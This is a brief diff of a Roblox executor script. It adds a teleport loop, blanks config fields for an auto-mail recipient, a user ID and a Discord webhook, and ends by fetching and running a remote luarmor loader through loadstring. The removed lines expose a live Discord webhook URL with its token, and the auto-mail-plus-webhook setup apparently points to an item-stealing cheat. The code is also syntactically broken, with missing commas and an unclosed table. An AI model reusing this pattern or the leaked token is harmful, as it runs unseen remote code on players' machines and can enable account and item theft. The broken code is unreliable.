@@ -1,5 +1,12 @@
+if game.PlaceId ~= 8737899170 then
+    repeat
+        game.ReplicatedStorage.Network.World1Teleport:InvokeServer()
+        task.wait(10)
+    until game.PlaceId == 8737899170
+end
+wait()
 getgenv().Config = {
-    ["AutoMailUser"] = "b9zr93kaA"
-    ["UserID"] = "1276614706144215132",
-    ["Webhook"] = "https://discord.com/api/webhooks/1309186012802715759/w2SfjOv5zczmRotMqC9pkOvXVonV3TktlQGejC0Rv2YylZmV9cAifHeqqxCG-TkCWPy5" 
+    ["AutoMailUser"] = ""
+    ["UserID"] = "",
+    ["Webhook"] = "" 
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/ea0ab6ccca282c76c23a12244973ad4e.lua"))()
